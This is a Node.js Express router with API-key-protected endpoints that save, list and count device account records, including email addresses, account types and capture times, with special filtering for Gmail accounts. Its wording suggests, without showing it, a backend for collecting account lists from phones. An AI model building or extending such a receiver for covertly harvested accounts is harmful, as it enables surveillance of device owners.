const express = require('express');
const router = express.Router();
const Account = require('../models/Account');
const { authenticateApiKey } = require('../middleware/auth');

// GET /api/accounts - Get all accounts
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        console.log('📧 Fetching all accounts...');
        
        const accounts = await Account.find().sort({ captureTime: -1 });
        
        console.log(`📧 Found ${accounts.length} accounts`);
        
        res.json({
            success: true,
            count: accounts.length,
            accounts: accounts
        });
    } catch (error) {
        console.error('❌ Error fetching accounts:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch accounts'
        });
    }
});

// POST /api/accounts - Save account information
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        console.log('📧 Received account data:', JSON.stringify(req.body, null, 2));
        
        const {
            accountName,
            accountType,
            accountTypeDisplayName,
            isGoogleAccount,
            isMicrosoftAccount,
            isSocialAccount,
            captureTime,
            deviceId
        } = req.body;
        
        // Validate required fields
        if (!accountName || !accountType || !deviceId) {
            return res.status(400).json({
                success: false,
                error: 'Missing required fields: accountName, accountType, deviceId'
            });
        }
        
        // Create unique ID for upsert (deviceId + accountName)
        const accountId = `${deviceId}:${accountName}`;
        
        // Upsert account data
        const accountData = {
            id: accountId,
            accountName,
            accountType,
            accountTypeDisplayName: accountTypeDisplayName || '',
            isGoogleAccount: Boolean(isGoogleAccount),
            isMicrosoftAccount: Boolean(isMicrosoftAccount),
            isSocialAccount: Boolean(isSocialAccount),
            captureTime: captureTime ? new Date(captureTime) : new Date(),
            deviceId
        };
        
        const result = await Account.findOneAndUpdate(
            { deviceId: deviceId, accountName: accountName },
            accountData,
            { 
                upsert: true, 
                new: true,
                setDefaultsOnInsert: true
            }
        );
        
        console.log(`✅ Account saved/updated: ${accountName} (${accountType})`);
        
        res.json({
            success: true,
            message: 'Account saved successfully',
            account: result
        });
        
    } catch (error) {
        console.error('❌ Error saving account:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to save account'
        });
    }
});

// GET /api/accounts/gmail - Get only Gmail accounts
router.get('/gmail', authenticateApiKey, async (req, res) => {
    try {
        console.log('📧 Fetching Gmail accounts...');
        
        const gmailAccounts = await Account.find({
            $or: [
                { accountType: 'com.google' },
                { isGoogleAccount: true },
                { accountName: { $regex: '@gmail.com$', $options: 'i' } },
                { accountName: { $regex: '@googlemail.com$', $options: 'i' } }
            ]
        }).sort({ captureTime: -1 });
        
        console.log(`📧 Found ${gmailAccounts.length} Gmail accounts`);
        
        res.json({
            success: true,
            count: gmailAccounts.length,
            accounts: gmailAccounts
        });
    } catch (error) {
        console.error('❌ Error fetching Gmail accounts:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch Gmail accounts'
        });
    }
});

// GET /api/accounts/stats - Get account statistics
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        console.log('📊 Fetching account statistics...');
        
        const totalAccounts = await Account.countDocuments();
        const gmailAccounts = await Account.countDocuments({
            $or: [
                { accountType: 'com.google' },
                { isGoogleAccount: true },
                { accountName: { $regex: '@gmail.com$', $options: 'i' } },
                { accountName: { $regex: '@googlemail.com$', $options: 'i' } }
            ]
        });
        const facebookAccounts = await Account.countDocuments({
            accountType: 'com.facebook.auth.login'
        });
        const microsoftAccounts = await Account.countDocuments({
            $or: [
                { accountType: 'com.microsoft.workaccount' },
                { accountType: 'com.microsoft.office' },
                { isMicrosoftAccount: true }
            ]
        });
        
        const socialAccounts = await Account.countDocuments({
            isSocialAccount: true
        });
        
        const deviceStats = await Account.aggregate([
            {
                $group: {
                    _id: '$deviceId',
                    count: { $sum: 1 },
                    gmailCount: {
                        $sum: {
                            $cond: [
                                {
                                    $or: [
                                        { $eq: ['$accountType', 'com.google'] },
                                        { $eq: ['$isGoogleAccount', true] },
                                        { $regexMatch: { input: '$accountName', regex: '@gmail.com$', options: 'i' } },
                                        { $regexMatch: { input: '$accountName', regex: '@googlemail.com$', options: 'i' } }
                                    ]
                                },
                                1,
                                0
                            ]
                        }
                    }
                }
            }
        ]);
        
        console.log(`📊 Account stats: Total=${totalAccounts}, Gmail=${gmailAccounts}, Facebook=${facebookAccounts}, Microsoft=${microsoftAccounts}, Social=${socialAccounts}`);
        
        res.json({
            success: true,
            stats: {
                totalAccounts,
                gmailAccounts,
                facebookAccounts,
                microsoftAccounts,
                socialAccounts,
                deviceStats
            }
        });
        
    } catch (error) {
        console.error('❌ Error fetching account statistics:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch account statistics'
        });
    }
});

module.exports = router;
